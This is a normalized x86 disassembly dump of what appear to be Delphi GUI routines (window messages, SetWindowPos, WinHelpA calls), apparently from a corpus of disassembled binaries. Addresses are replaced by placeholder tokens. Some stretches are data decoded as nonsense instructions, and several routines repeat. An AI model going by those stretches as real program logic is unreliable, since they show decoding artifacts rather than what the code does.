pop esi
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x224 ]
call [ ebx + 0x220 ]
pop esi
pop ebx
retn
sub_442d64
push ebx
mov ebx eax
mov eax ebx
call sub_44d6d4
push 0x0
mov eax [ ebx + 0x20c ]
push eax
push 0x141
mov eax ebx
call sub_45071c
push eax
call SendMessageA
xor eax eax
mov [ ebx + 0x240 ] eax
xor eax eax
mov [ ebx + 0x244 ] eax
pop ebx
retn
sub_442d9c
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x104 ]
mov ebx eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x210 ]
cmp ebx eax
jle r-xdata
cmp ebx 0x1
jge r-xdata
mov ebx eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x25c ] 0x1
xor eax eax
push ebp
push sub_442e32
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x9e
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0xfc ]
imul ebx
mov edx [ ebp - 0x4 ]
add eax [ edx + 0x4c ]
add eax 0x2
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x48 ]
push eax
push 0x0
push 0x0
push 0x0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x248 ]
push eax
call SetWindowPos
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_442e39
mov eax [ ebp - 0x4 ]
mov [ eax + 0x25c ] 0x0
retn
mov ebx 0x1
sub_442e39
push 0x5f
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x248 ]
push eax
call SetWindowPos
pop ebx
pop ecx
pop ebp
retn
sub_442e58
push esi
push edi
mov esi eax
mov edi [ esi + 0x23c ]
test edi edi
je r-xdata
mov [ esi + 0x23c ] edx
pop edi
pop esi
retn
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x8 ]
pop edi
pop esi
retn
sub_442e88
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_442f07
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
mov edx [ eax ]
call [ edx + 0xcc ]
inc eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_442f0e
lea eax [ ebp - 0x4 ]
call sub_403f50
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0xcc ]
mov edx eax
lea ecx [ ebp - 0x4 ]
mov eax [ ebx + 0x23c ]
mov edi [ eax ]
call [ edi + 0xc ]
mov eax [ ebp - 0x4 ]
push eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0xcc ]
mov edx eax
mov eax [ ebx + 0x23c ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov ecx eax
mov eax esi
pop edx
mov ebx [ eax ]
call [ ebx + 0xd4 ]
sub_442f14
push ebx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0xcc ]
inc eax
je r-xdata
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0xcc ]
mov edx eax
mov eax [ ebx + 0x23c ]
mov ecx [ eax ]
call [ ecx + 0x48 ]
sub_442f54
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
call sub_404400
xor eax eax
push ebp
push sub_442f9d
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx esi
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x23c ]
mov ebx [ eax ]
call [ ebx + 0x3c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_442fa4
lea eax [ ebp - 0x4 ]
call sub_403f50
retn
sub_442fac
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_44c414
mov eax esi
mov edx [ r-xdata ]
call sub_403304
mov [ ebx + 0x28 ] eax
pop esi
pop ebx
retn
sub_442fd0
push ebx
mov ebx eax
mov eax ebx
call sub_45627c
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x28 ]
mov edx [ eax ]
call [ edx + 0xc8 ]
push eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403304
pop edx
cmp dl [ eax + 0x69 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_443008
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x24 ]
test al al
je r-xdata
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
mov [ eax + 0x208 ] 0x1
xor edx edx
push ebp
push sub_44305e
push [ fs : edx ]
mov [ fs : edx ] esp
mov edx ebx
mov ecx [ eax ]
call [ ecx + 0xcc ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
mov [ eax + 0x208 ] 0x0
retn
sub_44306c
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_44c448
mov eax [ rw-data ]
cmp [ eax + 0xc ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_4034a0
mov eax esi
test bl bl
je r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x2
jne r-xdata
mov eax esi
pop esi
pop ebx
retn
call sub_4034f8
pop [ fs : 0x0 ]
add esp 0xc
mov [ esi + 0x184 ] 0x0
sub_4430c0
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
mov ecx ebx
mov edx esi
mov eax edi
call sub_4511a8
mov eax esi
mov edx [ r-xdata ]
call sub_4032e0
test al al
je r-xdata
pop edi
pop esi
pop ebx
retn
test bl bl
je r-xdata
mov dl [ esi + 0x69 ]
mov eax edi
mov ecx [ eax ]
call [ ecx + 0xcc ]
mov eax edi
mov edx [ eax ]
call [ edx + 0xc8 ]
test al al
jne r-xdata
sub_443114
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x6c ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x24 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_443138
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov eax [ edi ]
sub eax 0x201
je r-xdata
test [ ebx + 0x1c ] 0x10
jne r-xdata
sub eax 0x2
je r-xdata
mov edx edi
mov eax ebx
call sub_44e130
mov eax ebx
mov si 0xffb5
call sub_403350
test al al
jne r-xdata
sub eax 0xbb0e
je r-xdata
mov [ ebx + 0x208 ] 0x1
mov eax ebx
call sub_45071c
push eax
call SetFocus
mov [ ebx + 0x208 ] 0x0
mov eax ebx
mov si 0xffb5
call sub_403350
test al al
je r-xdata
cmp [ ebx + 0x208 ] 0x0
jne r-xdata
jmp r-xdata
pop edi
pop esi
pop ebx
retn
jmp r-xdata
sub_4431b0
push ebx
push esi
push edi
mov edi edx
mov esi eax
call sub_43dfe8
mov ebx eax
mov eax ebx
call sub_43e0c8
test al al
je r-xdata
mov edx edi
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
push 0x0
push 0x0
push 0x0
mov eax esi
call sub_45071c
mov edx eax
mov ecx [ edi + 0x4 ]
mov eax ebx
call sub_43e1c8
push 0x5
call GetStockObject
mov [ edi + 0xc ] eax
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_4431fc
push ebx
push esi
mov esi edx
mov ebx eax
call sub_43dfe8
call sub_43e0c8
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_44eb70
pop esi
pop ebx
retn
mov [ esi + 0xc ] 0x1
pop esi
pop ebx
retn
sub_443228
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_44d5a8
cmp [ ebx + 0x209 ] 0x0
je r-xdata
pop esi
pop ebx
retn
or [ esi + 0x4 ] 0x2000
sub_443260
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_44306c
mov edx 0x61
mov eax esi
call sub_4495dc
mov edx 0x11
mov eax esi
call sub_449600
mov dl 0x1
mov eax esi
call sub_450950
mov eax [ r-xdata ]
mov [ esi + 0x50 ] eax
mov [ esi + 0x210 ] 0x1
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4034a0
mov eax esi
pop esi
pop ebx
retn
call sub_4034f8
pop [ fs : 0x0 ]
add esp 0xc
sub_4432cc
push ebx
push esi
mov ebx eax
mov eax ebx
mov si 0xffc8
call sub_403350
test al al
jne r-xdata
cmp [ ebx + 0x210 ] 0x1
jne r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov al 0x1
xor eax eax
jmp r-xdata
pop esi
pop ebx
retn
sub_4432f8
mov dl [ eax + 0x212 ]
sub dl 0x1
jb r-xdata
cmp [ eax + 0x211 ] 0x0
je r-xdata
je r-xdata
mov dl 0x1
call sub_443380
retn
mov dl 0x2
call sub_443380
jmp r-xdata
xor edx edx
call sub_443380
retn
dec dl
je r-xdata
retn
mov dl 0x1
call sub_443380
jmp r-xdata
sub_443380
push ebx
push esi
mov ebx eax
cmp dl [ ebx + 0x212 ]
je r-xdata
pop esi
pop ebx
retn
mov [ ebx + 0x212 ] dl
mov eax ebx
call sub_450a20
test al al
je r-xdata
cmp [ ebx + 0x208 ] 0x0
jne r-xdata
push 0x0
xor eax eax
mov al [ ebx + 0x212 ]
push eax
push 0xf1
mov eax ebx
call sub_45071c
push eax
call SendMessageA
mov eax ebx
mov si 0xffeb
call sub_403350
sub_4433d4
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov edx edi
mov eax ebx
call sub_443228
mov ecx r-xdata
mov edx edi
mov eax ebx
call sub_44d4d4
mov eax ebx
mov si 0xffc8
call sub_403350
and eax 0x7f
lea eax [ eax * 8 + rw-data ]
xor edx edx
mov dl [ ebx + 0x210 ]
mov eax [ eax + edx * 4 ]
mov edx [ edi + 0x4 ]
or edx 0x5
or eax edx
mov [ edi + 0x4 ] eax
and [ edi + 0x24 ] 0xfffffffc
pop edi
pop esi
pop ebx
retn
sub_44342f
add [ ebx - 0x75 ] dl
fmul [ ebx - 0x5d65173d ]
add [ eax ] al
push 0x0
xor eax eax
mov al [ ebx + 0x212 ]
push eax
push 0xf1
mov eax ebx
call sub_45071c
push eax
call SendMessageA
pop ebx
retn
sub_443478
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_443506
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_449e20
mov edx [ ebp - 0x4 ]
mov ax [ edi + 0x4 ]
call sub_460a78
test al al
je r-xdata
mov edx edi
mov eax ebx
call sub_44fba0
mov eax ebx
mov si 0xffb8
call sub_403350
test al al
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc4 ]
mov eax ebx
mov si 0xffb5
call sub_403350
test al al
je r-xdata
mov [ edi + 0xc ] 0x1
jmp r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0xd0 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44350d
lea eax [ ebp - 0x4 ]
call sub_403f50
retn
sub_443524
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_44306c
mov edx 0x71
mov eax esi
call sub_4495dc
mov edx 0x11
mov eax esi
call sub_449600
mov eax [ r-xdata ]
mov [ esi + 0x50 ] eax
mov [ esi + 0x210 ] 0x1
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4034a0
mov eax esi
pop esi
pop ebx
retn
call sub_4034f8
pop [ fs : 0x0 ]
add esp 0xc
sub_44358c
push ebx
push esi
mov ebx eax
mov eax ebx
mov si 0xffc8
call sub_403350
test al al
jne r-xdata
cmp [ ebx + 0x210 ] 0x1
jne r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov al 0x1
xor eax eax
jmp r-xdata
pop esi
pop ebx
retn
sub_4435cc
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x30 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov edx [ ebp + 0x8 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
call sub_44d44c
mov esi eax
dec esi
test esi esi
jl r-xdata
inc esi
mov [ ebp - 0x4 ] 0x0
inc [ ebp - 0x4 ]
dec esi
jne r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_4032e0
test al al
je r-xdata
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_44d410
mov ebx eax
mov eax [ ebp + 0x8 ]
cmp ebx [ eax - 0x4 ]
je r-xdata
mov edi ebx
mov eax edi
mov edx [ eax ]
call [ edx + 0x3c ]
test eax eax
je r-xdata
xor edx edx
mov eax edi
mov ecx [ eax ]
call [ ecx + 0xcc ]
mov eax edi
mov edx [ eax ]
call [ edx + 0x3c ]
mov edx [ r-xdata ]
call sub_4032e0
test al al
je r-xdata
mov eax edi
mov edx [ eax ]
call [ edx + 0x3c ]
cmp [ eax + 0x95 ] 0x0
je r-xdata
mov eax edi
mov edx [ eax ]
call [ edx + 0x3c ]
xor edx edx
call sub_456510
sub_443688
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp bl [ eax + 0x211 ]
je r-xdata
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov [ eax + 0x211 ] bl
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_450950
mov eax [ ebp - 0x4 ]
call sub_450a20
test al al
je r-xdata
test bl bl
je r-xdata
push 0x0
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0xc8 ]
and eax 0x7f
push eax
push 0xf1
mov eax [ ebp - 0x4 ]
call sub_45071c
push eax
call SendMessageA
push ebp
call sub_4435cc
pop ecx
mov eax [ ebp - 0x4 ]
call sub_449a2c
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x208 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov si 0xffeb
call sub_403350
sub_443714
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov edx edi
mov eax ebx
call sub_443228
mov ecx r-xdata
mov edx edi
mov eax ebx
call sub_44d4d4
mov eax ebx
mov si 0xffc8
call sub_403350
and eax 0x7f
lea eax [ eax * 8 + rw-data ]
xor edx edx
mov dl [ ebx + 0x210 ]
mov eax [ eax + edx * 4 ]
mov edx [ edi + 0x4 ]
or edx 0x4
or eax edx
mov [ edi + 0x4 ] eax
pop edi
pop esi
pop ebx
retn
sub_44376b
add [ ebx - 0x75 ] dl
fmul [ ebx - 0x60a1173d ]
add [ eax ] al
push 0x0
xor eax eax
mov al [ ebx + 0x211 ]
push eax
push 0xf1
mov eax ebx
call sub_45071c
push eax
call SendMessageA
pop ebx
retn
sub_4437a0
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_443815
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_449e20
mov edx [ ebp - 0x4 ]
mov ax [ edi + 0x4 ]
call sub_460a78
test al al
je r-xdata
mov edx edi
mov eax ebx
call sub_44fba0
mov eax ebx
mov si 0xffb8
call sub_403350
test al al
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc4 ]
mov [ edi + 0xc ] 0x1
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44381c
lea eax [ ebp - 0x4 ]
call sub_403f50
retn
sub_443824
push esi
mov esi eax
mov ax [ edx + 0x6 ]
sub ax 0x1
jb r-xdata
mov dl 0x1
mov eax esi
mov ecx [ eax ]
call [ ecx + 0xcc ]
pop esi
retn
sub ax 0x4
je r-xdata
mov eax esi
mov si 0xffe9
call sub_403350
jmp r-xdata
pop esi
retn
sub_443854
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_443879
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_443880
retn
sub_443980
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_456360
mov [ esi + 0x60 ] 0x0
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4034a0
mov eax esi
pop esi
pop ebx
retn
call sub_4034f8
pop [ fs : 0x0 ]
add esp 0xc
sub_4439bc
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_4439e1
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4439e8
retn
sub_443a8c
insd
cmp al [ eax + eax + 0x77 ]
cmp al [ eax + eax - 0x7f ]
cmp al [ eax + eax + 0x25 ]
ja r-xdata
cmp cl [ edx + edi + 0x200044 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
xchg bx ax
cld
mov al 0xe
pop edi
rcl [ ecx ] cl
mov [ 0x4fc000b9 ] eax
jns r-xdata
cmp [ eax + eax + 0x3 ] eax
add [ eax ] al
add [ esi - 0x6d ] ah
cld
mov al 0xe
pop edi
rcl [ ecx ] cl
mov [ 0x4fc000b9 ] eax
jns r-xdata
std
cmp al [ eax + eax + 0x2d ]
cmp al [ eax + eax + 0x35 ]
cmp al [ eax + eax + 0x3d ]
cmp al [ eax + eax + 0x45 ]
cmp al [ eax + eax + 0x4d ]
inc esp
add [ ecx + 0x2500443a ] al
cmp al [ eax + eax + 0x55 ]
cmp al [ eax + eax + 0x5d ]
cmp al [ eax + eax + 0x65 ]
cmp al [ eax + eax + 0x5 ]
cmp al [ eax + eax + 0xd ]
cmp al [ eax + eax + 0x15 ]
cmp al [ eax + eax + 0x1d ]
cmp al [ eax + eax - 0x3 ]
dec ebp
cmp cl [ edx + edi + 0x200044 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
xchg ebx eax
cld
mov al 0xe
pop edi
rcl [ ecx ] cl
mov [ 0x4fc000b9 ] eax
jns r-xdata
sbb eax 0xfd00443a
cmp cl [ edx + edi + 0x200044 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
je r-xdata
xor eax [ eax ]
pop eax
pop eax
inc eax
add [ eax ] cl
xor [ eax ] eax
adc al 0x46
inc esp
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ eax + edx + 0x140040 ] dl
add [ eax ] al
dec eax
stosd [ edi ]
inc edx
add [ eax + eax ] bl
add [ eax ] al
push cs
push esp
push edi
imul ebp [ esi + 0x48 ] 0x56706c65
imul esp [ ebp + 0x77 ] 0x408d7265
add [ ebp - 0x75 ] dl
in al dx
push 0x0
push 0x0
push ebx
push esi
push edi
mov esi ecx
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_443c55
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_403f50
test edi edi
jne r-xdata
inc esp
add al dl
cmp al [ eax + eax ]
add [ eax ] al
add [ ebx + edi + 0x44 ] dh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + 0x2400443b ] cl
add [ eax ] al
add [ ecx + edx + 0x33840040 ] ah
inc eax
add [ eax + ebx * 2 ] bh
inc eax
add [ eax + 0x58 ] cl
inc eax
add [ eax - 0x73ffbfcd ] bl
lea eax [ ebp - 0x4 ]
mov edx edi
call sub_403fe8
cmp [ ebx + 0x1c ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ ebx + 0x1c ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
jmp r-xdata
mov eax esi
mov edx [ ebp - 0x4 ]
call sub_403fa4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_443c5c
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403f74
retn
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
mov ecx [ eax ]
call [ ecx + 0x1c ]
push [ ebp - 0x8 ]
push r-xdata
push [ ebp - 0x4 ]
lea eax [ ebp - 0x4 ]
mov edx 0x3
call sub_4042d0
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
mov ecx [ eax ]
call [ ecx + 0x20 ]
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
sub_443ba0
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
push edi
mov esi ecx
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_443c55
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_403f50
test edi edi
jne r-xdata
lea eax [ ebp - 0x4 ]
mov edx edi
call sub_403fe8
cmp [ ebx + 0x1c ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ ebx + 0x1c ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
jmp r-xdata
mov eax esi
mov edx [ ebp - 0x4 ]
call sub_403fa4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_443c5c
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403f74
retn
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
mov ecx [ eax ]
call [ ecx + 0x1c ]
push [ ebp - 0x8 ]
push r-xdata
push [ ebp - 0x4 ]
lea eax [ ebp - 0x4 ]
mov edx 0x3
call sub_4042d0
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
mov ecx [ eax ]
call [ ecx + 0x20 ]
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
sub_443c70
push ebx
mov ebx eax
mov eax ebx
call sub_443fa0
cmp [ ebx + 0x1c ] 0x0
je r-xdata
pop ebx
retn
mov edx [ ebx + 0xc ]
mov eax [ ebx + 0x1c ]
mov ecx [ eax ]
call [ ecx + 0x14 ]
lea eax [ ebx + 0x1c ]
call sub_4057bc
sub_443cac
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_443d13
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ rw-data ] 0x0
je r-xdata
mov ebx 0x1
lea ecx [ ebp - 0x4 ]
xor edx edx
mov eax ebx
call sub_443ba0
mov ecx [ ebp - 0x4 ]
mov edx esi
mov eax [ rw-data ]
mov ebx [ eax ]
call [ ebx + 0xc ]
test al al
je r-xdata
xor ebx ebx
jmp r-xdata
mov ebx 0x1
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_443d1a
lea eax [ ebp - 0x4 ]
call sub_403f50
retn
sub_443d24
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
push edi
mov edi edx
mov esi eax
xor eax eax
push ebp
push sub_443dac
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ rw-data ] 0x0
je r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_403124
mov ebx eax
lea edx [ ebp - 0x8 ]
mov eax esi
call sub_443c98
push [ ebp - 0x8 ]
push r-xdata
push edi
lea eax [ ebp - 0x4 ]
mov edx 0x3
call sub_4042d0
mov edx [ ebp - 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov edx edi
mov eax [ rw-data ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov ebx eax
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_443db3
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403f74
retn
sub_443dbf
inc [ edx ]
add [ eax ] al
add [ edx ] bh
and [ eax ] al
add [ eax + 0x5590c301 ] dh
mov ebp esp
push 0x0
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_443e47
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_4444e4
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_443e4e
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403f74
retn
mov [ ebx + 0x10 ] 0x2
lea edx [ ebp - 0x8 ]
mov eax [ ebx + 0x1c ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov edx [ ebp - 0x8 ]
lea ecx [ ebp - 0x4 ]
mov eax ebx
call sub_443ba0
cmp [ ebp - 0x4 ] 0x0
je r-xdata
push 0x0
push 0x3
mov eax [ ebp - 0x4 ]
call sub_404410
push eax
mov eax [ ebx + 0x1c ]
mov edx [ eax ]
call [ edx + 0xc ]
push eax
call WinHelpA
sub_443dcc
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_443e47
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_4444e4
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_443e4e
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403f74
retn
mov [ ebx + 0x10 ] 0x2
lea edx [ ebp - 0x8 ]
mov eax [ ebx + 0x1c ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov edx [ ebp - 0x8 ]
lea ecx [ ebp - 0x4 ]
mov eax ebx
call sub_443ba0
cmp [ ebp - 0x4 ] 0x0
je r-xdata
push 0x0
push 0x3
mov eax [ ebp - 0x4 ]
call sub_404410
push eax
mov eax [ ebx + 0x1c ]
mov edx [ eax ]
call [ edx + 0xc ]
push eax
call WinHelpA
sub_443e54
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x1c ] ecx
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0x8 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_443f4c
push [ fs : eax ]
mov [ fs : eax ] esp
test esi esi
jne r-xdata
lea eax [ ebp - 0x4 ]
push eax
mov [ ebp - 0x18 ] esi
mov [ ebp - 0x14 ] 0xb
lea ecx [ ebp - 0x1c ]
xor edx edx
mov eax ebx
call sub_443ba0
mov eax [ ebp - 0x1c ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0xb
lea edx [ ebp - 0x18 ]
mov ecx 0x1
mov eax r-xdata
call sub_408df4
mov eax ebx
call sub_4444e4
test al al
je r-xdata
mov ecx sub_4439f4
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b764
call sub_403908
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_443f53
lea eax [ ebp - 0x1c ]
call sub_403f50
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403f74
retn
lea ecx [ ebp - 0x8 ]
xor edx edx
mov eax ebx
call sub_443ba0
push 0x0
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax ebx
call sub_44443c
test al al
je r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov [ ebx + 0x10 ] 0x1
lea eax [ ebx + 0x14 ]
mov edx [ ebp - 0x4 ]
call sub_403fa4
mov eax [ ebp - 0x4 ]
call sub_404410
push eax
push 0x102
mov eax [ ebp - 0x8 ]
call sub_404410
push eax
mov eax [ ebx + 0x1c ]
mov edx [ eax ]
call [ edx + 0xc ]
push eax
call WinHelpA
sub_443fbc
push ebx
mov ebx eax
mov eax ebx
call sub_443fa0
cmp [ ebx + 0x1c ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
lea eax [ ebx + 0x1c ]
call sub_4057bc
pop ebx
retn
mov eax rw-data
call sub_4057bc
sub_443fec
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi edx
mov esi eax
xor eax eax
push ebp
push sub_444044
push [ fs : eax ]
mov [ fs : eax ] esp
mov bl 0x1
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44404b
lea eax [ ebp - 0x4 ]
call sub_403f50
retn
lea ecx [ ebp - 0x4 ]
xor edx edx
mov eax esi
call sub_443ba0
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax [ rw-data ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
mov ebx eax
sub_444054
push ebp
mov ebp esp
add esp 0xfffffef0
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x110 ] ecx
mov [ ebp - 0x4 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_44414a
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x10c ] esi
mov [ ebp - 0x108 ] 0xb
lea eax [ ebp - 0x10c ]
push eax
push 0x0
mov ecx r-xdata
lea eax [ ebp - 0x104 ]
mov edx 0xff
call sub_408db4
lea ecx [ ebp - 0x4 ]
xor edx edx
mov eax ebx
call sub_443ba0
mov eax ebx
call sub_4444e4
test al al
je r-xdata
